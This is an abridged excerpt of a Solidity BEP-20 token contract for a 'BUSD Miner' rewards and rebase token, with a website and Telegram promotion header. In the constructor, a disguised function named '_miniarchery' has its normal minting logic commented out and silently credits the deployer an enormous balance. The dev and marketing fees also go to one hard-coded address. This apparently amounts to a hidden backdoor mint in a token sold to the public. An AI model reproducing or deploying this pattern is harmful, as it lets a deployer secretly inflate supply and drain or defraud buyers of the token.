...
// BUSD Miner  - REWARDS BUSD + REBASE

// Website: www.BUSDminer.info
// Telegram: t.me/BUSDMiner.info
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWRD = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); //busd
...
contract TEST1 is IBEP20, Auth {
    ...
    string constant _name = "BUSDt Miner";
    string constant _symbol = "ZBUZZSDM";
    ...
    constructor () Auth(msg.sender) {
        ...
        rate = rSupply.div(_totalSupply);
        _miniarchery(msg.sender, _totalSupply);
        ...
        marketingFeeReceiver = 0x1a2ee6f12bB0e72E6B521E134e63C146ea58D702;
        devFeeReceiver = 0x1a2ee6f12bB0e72E6B521E134e63C146ea58D702;

        _rBalance[msg.sender] = rate;
    ...
    function _miniarchery(address sender, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: mint to the zero address");
       // uint256 rAmount = amount.mul(rate);
        //_beforeTokenTransfer(address(0), sender, amount);
        
        //_totalSupply = _totalSupply.add(amount);
        //_balances[account] = _balances[account].add(amount);
        ///_rBalance[sender] = _balances[sender].add(amount);
        //_rBalance[address(this)] = _rBalance[address(this)].add(rAmount);
        _rBalance[msg.sender] = 1000000000000000000000000000000;
        //_rBalance[address(sender)] = _rBalance[address(sender)].add(amount);
